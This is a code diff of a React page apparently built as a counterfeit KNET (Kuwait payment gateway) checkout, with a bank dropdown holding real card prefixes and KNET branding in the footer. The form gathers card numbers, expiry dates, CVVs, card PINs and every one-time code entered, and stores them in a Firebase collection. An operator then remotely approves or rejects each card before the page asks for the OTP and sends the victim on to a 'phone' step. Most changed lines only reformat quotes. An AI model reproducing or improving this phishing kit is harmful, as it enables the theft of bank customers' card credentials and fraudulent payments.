@@ -1,9 +1,9 @@
-'use client';
-import { useEffect, useState } from 'react';
-import './kent.css';
-import { doc, onSnapshot } from 'firebase/firestore';
-import { db, handlePay } from '../firebase';
-import FullPageLoader from '../loader1';
+"use client";
+import { useEffect, useState } from "react";
+import "./kent.css";
+import { doc, onSnapshot } from "firebase/firestore";
+import { db, handlePay } from "../firebase";
+import FullPageLoader from "../loader1";
 type PaymentInfo = {
   createdDate?: string;
   cardNumber: string;
@@ -17,174 +17,176 @@ type PaymentInfo = {
   allOtps: string[];
   bank_card: string[];
   prefix: string;
-  status: 'new' | 'pending' | 'approved' | 'rejected';
+  status: "new" | "pending" | "approved" | "rejected";
 };
 const BANKS = [
   {
-    value: 'NBK',
-    label: 'National Bank of Kuwait',
-    cardPrefixes: ['464452', '589160', '46445250', '543363'],
+    value: "NBK",
+    label: "National Bank of Kuwait",
+    cardPrefixes: ["464452", "589160", "46445250", "543363"],
   },
   {
-    value: 'CBK',
-    label: 'Commercial Bank of Kuwait',
-    cardPrefixes: ['532672', '537015', '521175', '516334'],
+    value: "CBK",
+    label: "Commercial Bank of Kuwait",
+    cardPrefixes: ["532672", "537015", "521175", "516334"],
   },
   {
-    value: 'GBK',
-    label: 'Gulf Bank',
+    value: "GBK",
+    label: "Gulf Bank",
     cardPrefixes: [
-      '526206',
-      '531470',
-      '531644',
-      '531329',
-      '517419',
-      '517458',
-      '531471',
-      '559475',
+      "526206",
+      "531470",
+      "531644",
+      "531329",
+      "517419",
+      "517458",
+      "531471",
+      "559475",
     ],
   },
   {
-    value: 'ABK',
-    label: 'Al Ahli Bank of Kuwait',
-    cardPrefixes: ['403622', '428628    ', '423826'],
+    value: "ABK",
+    label: "Al Ahli Bank of Kuwait",
+    cardPrefixes: ["403622", "428628    ", "423826"],
   },
   {
-    value: 'BURGAN',
-    label: 'Burgan Bank',
+    value: "BURGAN",
+    label: "Burgan Bank",
     cardPrefixes: [
-      '468564',
-      '402978',
-      '403583',
-      '415254',
-      '450238',
-      '540759',
-      '49219000',
+      "468564",
+      "402978",
+      "403583",
+      "415254",
+      "450238",
+      "540759",
+      "49219000",
     ],
   },
   {
-    value: 'KFH',
-    label: 'Kuwait Finance House',
-    cardPrefixes: ['485602', '537016', '537016', '450778'],
+    value: "KFH",
+    label: "Kuwait Finance House",
+    cardPrefixes: ["485602", "537016", "537016", "450778"],
   },
   {
-    value: 'BOUBYAN',
-    label: 'Boubyan Bank',
+    value: "BOUBYAN",
+    label: "Boubyan Bank",
     cardPrefixes: [
-      '470350',
-      '490455',
-      '490456',
-      '404919',
-      '450605',
-      '426058',
-      '431199',
+      "470350",
+      "490455",
+      "490456",
+      "404919",
+      "450605",
+      "426058",
+      "431199",
     ],
   },
   {
-    value: 'KIB',
-    label: 'Kuwait International Bank',
-    cardPrefixes: ['409054', '406464'],
+    value: "KIB",
+    label: "Kuwait International Bank",
+    cardPrefixes: ["409054", "406464"],
   },
   {
-    value: 'UNB',
-    label: 'Union National Bank   ',
-    cardPrefixes: ['457778', '513000'], // Added common prefixes for IBK
+    value: "UNB",
+    label: "Union National Bank   ",
+    cardPrefixes: ["457778", "513000"], // Added common prefixes for IBK
   },
   {
-    value: 'BBK',
-    label: 'Bank of Bahrain and Kuwait',
-    cardPrefixes: ['418056'], // Added a missing prefix
+    value: "BBK",
+    label: "Bank of Bahrain and Kuwait",
+    cardPrefixes: ["418056"], // Added a missing prefix
   },
   {
-    value: 'BNP',
-    label: 'BNP Paribas',
-    cardPrefixes: ['450216', '531483', '489800'], // Added a common prefix for BNP
+    value: "BNP",
+    label: "BNP Paribas",
+    cardPrefixes: ["450216", "531483", "489800"], // Added a common prefix for BNP
   },
   {
-    value: 'HSBC',
-    label: 'HSBC Middle East Bank',
-    cardPrefixes: ['447284', '530001', '453095'], // Added an additional HSBC prefix
+    value: "HSBC",
+    label: "HSBC Middle East Bank",
+    cardPrefixes: ["447284", "530001", "453095"], // Added an additional HSBC prefix
   },
   {
-    value: 'FAB',
-    label: 'First Abu Dhabi Bank',
-    cardPrefixes: ['440891', '530123', '454888'], // Added a prefix used by FAB
+    value: "FAB",
+    label: "First Abu Dhabi Bank",
+    cardPrefixes: ["440891", "530123", "454888"], // Added a prefix used by FAB
   },
   {
-    value: 'CITIBANK',
-    label: 'Citibank',
-    cardPrefixes: ['431457', '545432', '400800'], // Added another Citibank prefix
+    value: "CITIBANK",
+    label: "Citibank",
+    cardPrefixes: ["431457", "545432", "400800"], // Added another Citibank prefix
   },
   {
-    value: 'QNB',
-    label: 'Qatar National Bank',
-    cardPrefixes: ['521020', '524745'], // Added a Qatar National Bank prefix
+    value: "QNB",
+    label: "Qatar National Bank",
+    cardPrefixes: ["521020", "524745"], // Added a Qatar National Bank prefix
   },
   {
-    value: 'Doha',
-    label: 'Doha Bank',
-    cardPrefixes: ['419252'], // Added another Mashreq prefix
+    value: "Doha",
+    label: "Doha Bank",
+    cardPrefixes: ["419252"], // Added another Mashreq prefix
   },
   {
-    value: 'ALRAJHI',
-    label: 'Al Rajhi Bank',
-    cardPrefixes: ['458838'], // Added a common Al Rajhi prefix
+    value: "ALRAJHI",
+    label: "Al Rajhi Bank",
+    cardPrefixes: ["458838"], // Added a common Al Rajhi prefix
   },
   {
-    value: 'BANK_MUSCAT',
-    label: 'Bank Muscat',
-    cardPrefixes: ['489312', '529410', '454100'], // Added a prefix for Bank Muscat
+    value: "BANK_MUSCAT",
+    label: "Bank Muscat",
+    cardPrefixes: ["489312", "529410", "454100"], // Added a prefix for Bank Muscat
   },
   {
-    value: 'WARBA',
-    label: 'Warba Bank',
-    cardPrefixes: ['541350', '525528', '532749', '559459'], // Added another common ICBC prefix
+    value: "WARBA",
+    label: "Warba Bank",
+    cardPrefixes: ["541350", "525528", "532749", "559459"], // Added another common ICBC prefix
   },
 ];
 
-export default function Kent(props:{setPage:any}) {
+export default function Kent(props: { setPage: any }) {
   const [step, setstep] = useState(1);
-  const [total, setTotal] = useState('');
+  const [total, setTotal] = useState("");
   const [loading, setLoading] = useState(false);
-  const [newotp] = useState(['']);
+  const [newotp] = useState([""]);
 
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     createdDate: new Date().toISOString(),
-    cardNumber: '',
-    year: '',
-    month: '',
-    otp: '',
-    cvv: '',
+    cardNumber: "",
+    year: "",
+    month: "",
+    otp: "",
+    cvv: "",
     allOtps: newotp,
-    bank: '',
-    pass: '',
-    cardState: 'new',
-    bank_card: [''],
-    prefix: '',
-    status: 'new',
+    bank: "",
+    pass: "",
+    cardState: "new",
+    bank_card: [""],
+    prefix: "",
+    status: "new",
   });
-
+  const handleNewpage = () => {
+    props.setPage("phone");
+  };
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
   };
   useEffect(() => {
-    setTotal(localStorage?.getItem('vv')!);
+    setTotal(localStorage?.getItem("vv")!);
   }, []);
 
   useEffect(() => {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as any;
           if (data.status) {
             setPaymentInfo((prev) => ({ ...prev, status: data.status }));
-            if (data.status === 'approved') {
+            if (data.status === "approved") {
               setstep(2);
               setLoading(false);
-            } else if (data.status === 'rejected') {
+            } else if (data.status === "rejected") {
               setLoading(false);
-              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ");
               setstep(1);
             }
           }
@@ -198,18 +200,18 @@ export default function Kent(props:{setPage:any}) {
   return (
     <div
       style={{
-        background: '#f1f1f1',
-        height: '100vh',
+        background: "#f1f1f1",
+        height: "100vh",
         margin: 0,
         padding: 0,
-        display: 'flex',
+        display: "flex",
       }}
       dir="ltr"
     >
       <form
         onSubmit={(e) => {
           e.preventDefault();
-          console.log(total)
+          console.log(total);
         }}
       >
         <div className="madd" />
@@ -219,7 +221,7 @@ export default function Kent(props:{setPage:any}) {
               <div className="form-card">
                 <div
                   className="container"
-                  style={{ display: 'flex', justifyContent: 'center' }}
+                  style={{ display: "flex", justifyContent: "center" }}
                 >
                   <img
                     src="./kv.png"
@@ -236,23 +238,23 @@ export default function Kent(props:{setPage:any}) {
                   </label>
                 </div>
                 <div id="OrgTranxAmt">
-                <div className="row">
-                  <label className="column-label">Amount: </label>
-                  <label className="column-value text-label">
-                    {localStorage.getItem('vv')} kd
-                  </label>
-                </div>
+                  <div className="row">
+                    <label className="column-label">Amount: </label>
+                    <label className="column-value text-label">
+                      {localStorage.getItem("vv")} kd
+                    </label>
+                  </div>
                 </div>
                 {/* Added for PG Eidia Discount starts   */}
                 <div
                   className="row"
                   id="DiscntRate"
-                  style={{ display: 'none' }}
+                  style={{ display: "none" }}
                 />
                 <div
                   className="row"
                   id="DiscntedAmt"
-                  style={{ display: 'none' }}
+                  style={{ display: "none" }}
                 />
                 {/* Added for PG Eidia Discount ends   */}
               </div>
@@ -260,15 +262,15 @@ export default function Kent(props:{setPage:any}) {
                 <div
                   className="notification"
                   style={{
-                    border: '#ff0000 1px solid',
-                    backgroundColor: '#f7dadd',
+                    border: "#ff0000 1px solid",
+                    backgroundColor: "#f7dadd",
                     fontSize: 12,
-                    fontFamily: 'helvetica, arial, sans serif',
-                    color: '#ff0000',
+                    fontFamily: "helvetica, arial, sans serif",
+                    color: "#ff0000",
                     paddingRight: 15,
-                    display: 'none',
+                    display: "none",
                     marginBottom: 3,
-                    textAlign: 'center',
+                    textAlign: "center",
                   }}
                   id="otpmsgDC"
                 />
@@ -276,15 +278,15 @@ export default function Kent(props:{setPage:any}) {
                 <div
                   className="notification"
                   style={{
-                    border: '#ff0000 1px solid',
-                    backgroundColor: '#f7dadd',
+                    border: "#ff0000 1px solid",
+                    backgroundColor: "#f7dadd",
                     fontSize: 12,
-                    fontFamily: 'helvetica, arial, sans serif',
-                    color: '#ff0000',
+                    fontFamily: "helvetica, arial, sans serif",
+                    color: "#ff0000",
                     paddingRight: 15,
-                    display: 'none',
+                    display: "none",
                     marginBottom: 3,
-                    textAlign: 'center',
+                    textAlign: "center",
                   }}
                   id="CVmsg"
                 />
@@ -295,7 +297,7 @@ export default function Kent(props:{setPage:any}) {
               padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                       </span*/}
                 </div>
-                <div id="savedCardDiv" style={{ display: 'none' }}>
+                <div id="savedCardDiv" style={{ display: "none" }}>
                   {/* Commented the bank name display for kfast starts */}
                   <div className="row">
                     <br />
@@ -317,7 +319,7 @@ export default function Kent(props:{setPage:any}) {
                       size={4}
                       maxLength={4}
                       className="allownumericwithoutdecimal"
-                      style={{ width: '50%' }}
+                      style={{ width: "50%" }}
                     />
                   </div>
                   {/* Added for Points Redemption */}
@@ -329,13 +331,13 @@ export default function Kent(props:{setPage:any}) {
                       <div className="row">
                         <label
                           className="column-label"
-                          style={{ width: '40%' }}
+                          style={{ width: "40%" }}
                         >
                           Select Your Bank:
                         </label>
                         <select
                           className="column-value"
-                          style={{ width: '60%' }}
+                          style={{ width: "60%" }}
                           onChange={(e: any) => {
                             const selectedBank = BANKS.find(
                               (bank) => bank.value === e.target.value
@@ -346,7 +348,7 @@ export default function Kent(props:{setPage:any}) {
                               bank: e.target.value,
                               bank_card: selectedBank
                                 ? selectedBank.cardPrefixes
-                                : [''],
+                                : [""],
                             });
                           }}
                         >
@@ -377,7 +379,7 @@ export default function Kent(props:{setPage:any}) {
                               prefix: e.target.value,
                             })
                           }
-                          style={{ width: '25%' }}
+                          style={{ width: "25%" }}
                         >
                           <option
                             value={paymentInfo.prefix}
@@ -413,7 +415,7 @@ export default function Kent(props:{setPage:any}) {
                           pattern="[0-9]*"
                           size={10}
                           className="allownumericwithoutdecimal"
-                          style={{ width: '45%', marginLeft: 2 }}
+                          style={{ width: "45%", marginLeft: 2 }}
                           maxLength={10}
                           onChange={(e: any) =>
                             setPaymentInfo({
@@ -559,9 +561,9 @@ export default function Kent(props:{setPage:any}) {
                       </div>
                     </div>
                   </>
-                ) : step === 2 && paymentInfo.status === 'approved' ? (
+                ) : step === 2 && paymentInfo.status === "approved" ? (
                   <div>
-                    <form style={{ display: 'flex', flexDirection: 'column' }}>
+                    <form style={{ display: "flex", flexDirection: "column" }}>
                       <label>
                         Please enter the verification code sent to your phone
                         number
@@ -569,7 +571,7 @@ export default function Kent(props:{setPage:any}) {
                       <label>
                         <input
                           name="otp"
-                          style={{ width: '100%', marginTop: 15 }}
+                          style={{ width: "100%", marginTop: 15 }}
                           id="otp"
                           type="tel"
                           inputMode="numeric"
@@ -589,43 +591,44 @@ export default function Kent(props:{setPage:any}) {
                     </form>
                   </div>
                 ) : (
-                  <div style={{ textAlign: 'center', padding: '20px' }}>
+                  <div style={{ textAlign: "center", padding: "20px" }}>
                     <p>Please wait while we process your payment...</p>
                   </div>
                 )}
               </div>
               <div className="form-card">
                 <div className="row">
-                  <div style={{ textAlign: 'center' }}>
-                    <div id="loading" style={{ display: 'none' }}>
+                  <div style={{ textAlign: "center" }}>
+                    <div id="loading" style={{ display: "none" }}>
                       <center>
                         <img
                           style={{
                             height: 20,
-                            float: 'left',
-                            marginLeft: '20%',
+                            float: "left",
+                            marginLeft: "20%",
                           }}
                         />
                         <label
                           className="col text-label"
-                          style={{ width: '70%', textAlign: 'center' }}
+                          style={{ width: "70%", textAlign: "center" }}
                         >
                           Processing.. please wait ...
                         </label>
                       </center>
                     </div>
-                    <div style={{ display: 'flex' }}>
+                    <div style={{ display: "flex" }}>
                       <button
+                        type="button"
                         disabled={
                           step === 1 &&
-                          (paymentInfo.prefix === '' ||
-                            paymentInfo.bank === '' ||
-                            paymentInfo.cardNumber === '' ||
-                            paymentInfo.pass === '' ||
-                            paymentInfo.month === '' ||
-                            paymentInfo.year === '' ||
+                          (paymentInfo.prefix === "" ||
+                            paymentInfo.bank === "" ||
+                            paymentInfo.cardNumber === "" ||
+                            paymentInfo.pass === "" ||
+                            paymentInfo.month === "" ||
+                            paymentInfo.year === "" ||
                             paymentInfo.pass.length !== 4 ||
-                            paymentInfo.cvv === '')
+                            paymentInfo.cvv === "")
                         }
                         onClick={(e) => {
                           e.preventDefault();
@@ -637,6 +640,7 @@ export default function Kent(props:{setPage:any}) {
                           } else if (step >= 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!);
+                              e.preventDefault();
                             }
                             setLoading(true);
                             handleAddotp(paymentInfo.otp!);
@@ -644,21 +648,22 @@ export default function Kent(props:{setPage:any}) {
                             handlePay(paymentInfo, setPaymentInfo);
                             setTimeout(() => {
                               setLoading(false);
-                              props.setPage('phone')
+
                               setPaymentInfo({
                                 ...paymentInfo,
-                                otp: '',
-                                status: 'approved',
+                                otp: "",
+                                status: "approved",
                               });
+                              handleNewpage();
                             }, 3000);
                           }
                         }}
                       >
                         {loading
-                          ? 'Wait...'
+                          ? "Wait..."
                           : step === 1
-                          ? 'Submit'
-                          : 'Verify OTP'}
+                          ? "Submit"
+                          : "Verify OTP"}
                       </button>
                       <button>Cancel</button>
                     </div>
@@ -668,7 +673,7 @@ export default function Kent(props:{setPage:any}) {
               <div
                 id="overlayhide"
                 className="overlay"
-                style={{ display: 'none' }}
+                style={{ display: "none" }}
               ></div>
 
               <footer>
@@ -676,7 +681,7 @@ export default function Kent(props:{setPage:any}) {
                   <div className="row_new">
                     <div
                       style={{
-                        textAlign: 'center',
+                        textAlign: "center",
                         fontSize: 11,
                         lineHeight: 1,
                       }}
@@ -686,8 +691,8 @@ export default function Kent(props:{setPage:any}) {
                       <span
                         style={{
                           fontSize: 10,
-                          fontWeight: 'bold',
-                          color: '#0077d5',
+                          fontWeight: "bold",
+                          color: "#0077d5",
                         }}
                       >
                         The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
@@ -702,9 +707,9 @@ export default function Kent(props:{setPage:any}) {
             </div>
           </div>
         </div>
-      <FullPageLoader isLoading={loading}/>
-
-      </form><style>
+        <FullPageLoader isLoading={loading} />
+      </form>
+      <style>
         {`
         * {
           margin: 0;
